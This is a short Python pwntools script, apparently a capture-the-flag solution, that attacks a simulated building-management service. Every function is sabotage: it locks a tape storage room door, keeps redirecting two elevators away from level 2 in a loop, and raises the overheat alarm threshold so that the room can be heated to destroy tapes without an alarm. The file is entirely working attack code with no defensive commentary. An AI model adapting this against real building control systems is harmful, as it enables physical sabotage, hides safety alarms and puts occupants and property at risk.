#!/usr/bin/python3

from pwn import *
from threading import Thread
from random import choice

HOST = "172.17.0.2" ; PORT = 5001

io = remote(HOST, PORT)
ele_io = remote(HOST, PORT)


door = ["multiStateOutput", "102"]

ele1 = ["analogOutput", "82"]
ele2 = ["analogOutput", "85"]

therm = ["analogOutput", "21"]
ovhp = ["analogOutput", "23"]

def LockDoor():
    global io, door

    payload = f"{door[0]} {door[1]} presentValue 2"

    io.sendline(b"3")
    sleep(1)
    io.sendlineafter(b">>> " , payload.encode())
    io.clean()
    log.info("Locked the Door of Tape Storage Room")

def DontAllowElevatorsToStopAtLevel2():
    global ele_io, ele1, ele2

    def readTargetFloor(ele):
        ele_io.clean()
        ele_io.sendline(b"2")
        payload = f"{ele[0]} {ele[1]} presentValue"
        ele_io.clean()
        ele_io.sendline(payload.encode())

        value = ele_io.readline().decode().rstrip("\n")
        return value

    while True:
        ele1_targ_level = readTargetFloor(ele1)
        ele2_targ_level = readTargetFloor(ele2)

        if(ele1_targ_level == "2"):
            rc = choice([1, 3])
            payload = f"{ele1[0]} {ele1[1]} presentValue {rc}"
            ele_io.sendline(b"3")
            ele_io.sendlineafter(b">>> ", payload.encode())
            
            log.info("Elevator 1 tried to stop at level 2: moved to " + str(rc))

        elif (ele2_targ_level == "2"):
            rc = choice([1, 3])
            payload = f"{ele2[0]} {ele2[1]} presentValue {rc}"
            ele_io.sendline(b"3")
            ele_io.sendlineafter(b">>> ", payload.encode())

            log.info("Elevator 2 tried to stop at level 2: moved to " + str(rc))

        
def BurnTapesUp():
    global io, ovhp, therm

    def IncreaseOverHeatPoint():
        io.sendline(b"3")
        sleep(1)
        payload = f"{ovhp[0]} {ovhp[1]} presentValue 35"
        io.sendlineafter(b">>> ", payload.encode())
        log.info("Set over heat point to 35 to not araise alarm")

    def SetPointTo33():
        io.sendline(b"3")
        sleep(1)
        payload = f"{therm[0]} {therm[1]} presentValue 33"
        io.sendlineafter(b">>> ", payload.encode())
        log.info("Set point to 33")

    IncreaseOverHeatPoint()
    SetPointTo33()



LockDoor()
ElePois = Thread(target=DontAllowElevatorsToStopAtLevel2)
ElePois.start()

BurnTapesUp()

io.clean()
io.interactive()